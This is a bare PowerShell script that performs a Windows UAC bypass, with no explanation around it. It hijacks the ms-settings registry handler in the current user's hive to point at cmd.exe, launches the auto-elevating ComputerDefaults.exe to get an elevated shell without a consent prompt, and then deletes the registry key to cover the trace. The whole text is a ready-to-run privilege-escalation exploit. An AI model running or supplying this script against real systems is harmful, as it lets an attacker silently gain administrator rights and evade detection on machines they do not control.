New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value cmd.exe -Force
Start-Sleep -s 1
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
Start-Sleep -s 1
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force